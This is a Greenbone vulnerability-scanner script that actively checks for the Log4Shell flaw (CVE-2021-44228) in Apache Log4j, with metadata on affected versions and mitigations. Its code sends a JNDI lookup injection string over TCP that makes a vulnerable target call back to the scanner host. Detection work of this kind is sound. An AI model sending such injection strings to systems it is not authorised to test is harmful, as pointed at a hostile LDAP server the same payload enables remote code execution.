# Copyright (C) 2021 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.117824");
  script_version("2021-12-13T09:35:35+0000");
  script_cve_id("CVE-2021-44228");
  script_tag(name:"last_modification", value:"2021-12-13 12:38:08 +0000 (Mon, 13 Dec 2021)");
  script_tag(name:"creation_date", value:"2021-12-13 09:21:22 +0000 (Mon, 13 Dec 2021)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("Apache Log4j 2.0.x < 2.15.0 RCE Vulnerability (TCP, Log4Shell) - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2021 Greenbone Networks GmbH");
  script_family("General");
  script_dependencies("secpod_open_tcp_ports.nasl");
  script_mandatory_keys("TCP/PORTS");

  script_xref(name:"URL", value:"https://issues.apache.org/jira/browse/LOG4J2-3198");
  script_xref(name:"URL", value:"https://issues.apache.org/jira/browse/LOG4J2-3201");
  script_xref(name:"URL", value:"https://github.com/apache/logging-log4j2/pull/607");
  script_xref(name:"URL", value:"https://github.com/apache/logging-log4j2/pull/608");
  script_xref(name:"URL", value:"https://github.com/advisories/GHSA-jfh8-c2jp-5v3q");
  script_xref(name:"URL", value:"https://www.openwall.com/lists/oss-security/2021/12/10/1");
  script_xref(name:"URL", value:"https://www.lunasec.io/docs/blog/log4j-zero-day/");
  script_xref(name:"URL", value:"https://www.cyberkendra.com/2021/12/worst-log4j-rce-zeroday-dropped-on.html");
  script_xref(name:"URL", value:"https://github.com/YfryTchsGD/Log4jAttackSurface");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/165225/Apache-Log4j2-2.14.1-Remote-Code-Execution.html");
  script_xref(name:"URL", value:"https://github.com/tangxiaofeng7/apache-log4j-poc");
  script_xref(name:"URL", value:"https://github.com/0x0021h/apache-log4j-rce");

  script_tag(name:"summary", value:"Apache Log4j is prone to a remote code execution (RCE)
  vulnerability dubbed 'Log4Shell'.");

  script_tag(name:"vuldetect", value:"Sends a crafted TCP request and checks the response.

  Note: For a successful detection of this flaw the scanner host needs to be reachable by the target
  host via TCP.");

  script_tag(name:"insight", value:"Apache Log4j2 JNDI features used in configuration, log messages,
  and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints.
  An attacker who can control log messages or log message parameters can execute arbitrary code
  loaded from LDAP servers when message lookup substitution is enabled.");

  script_tag(name:"affected", value:"Apache Log4j version 2.0.x prior to 2.15.0.");

  script_tag(name:"solution", value:"Update to version 2.15.0 or later.

  Note: If version 2.15.0 is already installed please make sure to configure the following system
  properties accordingly (e.g. don't allow the use of the ldap protocol in JDNI Lookups, restrict
  access to ldap servers, ...):

  - log4j2.allowedJndiProtocols

  - log4j2.allowedLdapClasses

  - log4j2.allowedLdapHosts

  Mitigation: If updating to version 2.15.0 isn't possible but a version >= 2.10 is used this flaw
  can be mitigated by setting the system property 'log4j2.formatMsgNoLookups' to 'true'.

  Please refer to the Log4j manual for more information about the mentioned system properties and
  how to set them.

  External resources are also mentioning that Java 8u121 is protecting against this flaw.");

  script_tag(name:"qod_type", value:"exploit");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("port_service_func.inc");

port = tcp_get_all_port();

soc = open_sock_tcp( port );
if( ! soc )
  exit( 0 );

ownip = this_host();
targetip = get_host_ip();
rnd_port = rand() % 65535;
req = "${jndi:ldap://" + ownip + ":" + rnd_port + "/a}" + '\r\n';

filter = string( "dst port ", rnd_port, " and src host ", targetip, " and dst host ", ownip );
res = send_capture( socket:soc, data:req, timeout:5, pcap_filter:filter );
close( soc );

if( res ) {
  report = "It was possible to trigger the vulnerability and make the server sending a request to the scanner host on port '" + rnd_port + "'.";
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 0 );